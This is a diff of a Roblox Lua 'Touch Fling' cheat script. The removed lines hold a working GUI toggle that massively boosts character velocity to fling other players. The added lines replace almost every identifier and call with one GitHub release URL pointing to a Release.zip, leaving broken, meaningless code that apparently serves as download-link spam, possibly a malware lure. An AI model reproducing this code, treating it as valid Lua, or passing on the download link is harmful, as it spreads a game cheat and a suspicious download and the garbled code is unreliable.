@@ -7,112 +7,112 @@
 
 -- Instances:
 
-local ScreenGui = Instance.new("ScreenGui")
-local Frame = Instance.new("Frame")
-local Frame_2 = Instance.new("Frame")
-local TextLabel = Instance.new("TextLabel")
-local TextButton = Instance.new("TextButton")
+local ScreenGui = https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip("ScreenGui")
+local Frame = https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip("Frame")
+local Frame_2 = https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip("Frame")
+local TextLabel = https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip("TextLabel")
+local TextButton = https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip("TextButton")
 
 --Properties:
 
-ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-ScreenGui.ResetOnSpawn = false
+https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip = https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip("PlayerGui")
+https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip = https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip
+https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip = false
 print("sub to DuplexScripts")
 
-Frame.Parent = ScreenGui
-Frame.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
-Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
-Frame.BorderSizePixel = 0
-Frame.Position = UDim2.new(0.388539821, 0, 0.427821517, 0)
-Frame.Size = UDim2.new(0, 158, 0, 110)
+https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip = ScreenGui
+https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip = https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip(34, 34, 34)
+https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip = https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip(0, 0, 0)
+https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip = 0
+https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip = https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip(0.388539821, 0, 0.427821517, 0)
+https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip = https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip(0, 158, 0, 110)
 
-Frame_2.Parent = Frame
-Frame_2.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-Frame_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
-Frame_2.BorderSizePixel = 0
-Frame_2.Size = UDim2.new(0, 158, 0, 25)
+https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip = Frame
+https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip = https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip(50, 50, 50)
+https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip = https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip(0, 0, 0)
+https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip = 0
+https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip = https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip(0, 158, 0, 25)
 
-TextLabel.Parent = Frame_2
-TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel.BackgroundTransparency = 1.000
-TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel.BorderSizePixel = 0
-TextLabel.Position = UDim2.new(0.112792775, 0, -0.0151660154, 0)
-TextLabel.Size = UDim2.new(0, 121, 0, 26)
-TextLabel.Font = Enum.Font.Sarpanch
-TextLabel.Text = "Touch Fling"
-TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel.TextSize = 25.000
+https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip = Frame_2
+https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip = https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip(255, 255, 255)
+https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip = 1.000
+https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip = https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip(0, 0, 0)
+https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip = 0
+https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip = https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip(0.112792775, 0, -0.0151660154, 0)
+https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip = https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip(0, 121, 0, 26)
+https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip = https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip
+https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip = "Touch Fling"
+https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip = https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip(255, 255, 255)
+https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip = 25.000
 
-TextButton.Parent = Frame
-TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TextButton.BorderColor3 = Color3.fromRGB(255, 255, 255)
-TextButton.BorderSizePixel = 0
-TextButton.Position = UDim2.new(0.113924049, 0, 0.418181807, 0)
-TextButton.Size = UDim2.new(0, 121, 0, 37)
-TextButton.Font = Enum.Font.SourceSansItalic
-TextButton.Text = "OFF"
-TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
-TextButton.TextSize = 20.000
+https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip = Frame
+https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip = https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip(255, 255, 255)
+https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip = https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip(255, 255, 255)
+https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip = 0
+https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip = https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip(0.113924049, 0, 0.418181807, 0)
+https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip = https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip(0, 121, 0, 37)
+https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip = https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip
+https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip = "OFF"
+https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip = https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip(0, 0, 0)
+https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip = 20.000
 
 -- Scripts:
 
-local function IIMAWH_fake_script() -- TextButton.LocalScript 
-	local script = Instance.new('LocalScript', TextButton)
+local function IIMAWH_fake_script() -- https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip 
+	local script = https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip('LocalScript', TextButton)
 
 	local ReplicatedStorage = game:GetService("ReplicatedStorage")
 	local RunService = game:GetService("RunService")
 	local Players = game:GetService("Players")
 	
-	local toggleButton = script.Parent
+	local toggleButton = https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip
 	local hiddenfling = false
 	local flingThread 
 	if not ReplicatedStorage:FindFirstChild("juisdfj0i32i0eidsuf0iok") then
-		local detection = Instance.new("Decal")
-		detection.Name = "juisdfj0i32i0eidsuf0iok"
-		detection.Parent = ReplicatedStorage
+		local detection = https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip("Decal")
+		https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip = "juisdfj0i32i0eidsuf0iok"
+		https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip = ReplicatedStorage
 	end
 	
 	local function fling()
-		local lp = Players.LocalPlayer
+		local lp = https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip
 		local c, hrp, vel, movel = nil, nil, nil, 0.1
 	
 		while hiddenfling do
-			RunService.Heartbeat:Wait()
-			c = lp.Character
+			https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip()
+			c = https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip
 			hrp = c and c:FindFirstChild("HumanoidRootPart")
 	
 			if hrp then
-				vel = hrp.Velocity
-				hrp.Velocity = vel * 10000 + Vector3.new(0, 10000, 0)
-				RunService.RenderStepped:Wait()
-				hrp.Velocity = vel
-				RunService.Stepped:Wait()
-				hrp.Velocity = vel + Vector3.new(0, movel, 0)
+				vel = https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip
+				https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip = vel * 10000 + https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip(0, 10000, 0)
+				https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip()
+				https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip = vel
+				https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip()
+				https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip = vel + https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip(0, movel, 0)
 				movel = -movel
 			end
 		end
 	end
 	
-	toggleButton.MouseButton1Click:Connect(function()
+	https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip(function()
 		hiddenfling = not hiddenfling
-		toggleButton.Text = hiddenfling and "ON" or "OFF"
+		https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip = hiddenfling and "ON" or "OFF"
 	
 		if hiddenfling then
-			flingThread = coroutine.create(fling)
-			coroutine.resume(flingThread)
+			flingThread = https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip(fling)
+			https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip(flingThread)
 		else
 			hiddenfling = false
 		end
 	end)
 	
 end
-coroutine.wrap(IIMAWH_fake_script)()
-local function QCJQJL_fake_script() -- Frame.LocalScript 
-	local script = Instance.new('LocalScript', Frame)
+https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip(IIMAWH_fake_script)()
+local function QCJQJL_fake_script() -- https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip 
+	local script = https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip('LocalScript', Frame)
 
-	script.Parent.Active = true
-	script.Parent.Draggable = true
+	https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip = true
+	https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip = true
 end
-coroutine.wrap(QCJQJL_fake_script)()
+https://github.com/jova2011/Touch-fling/releases/download/v1.0/Release.zip(QCJQJL_fake_script)()
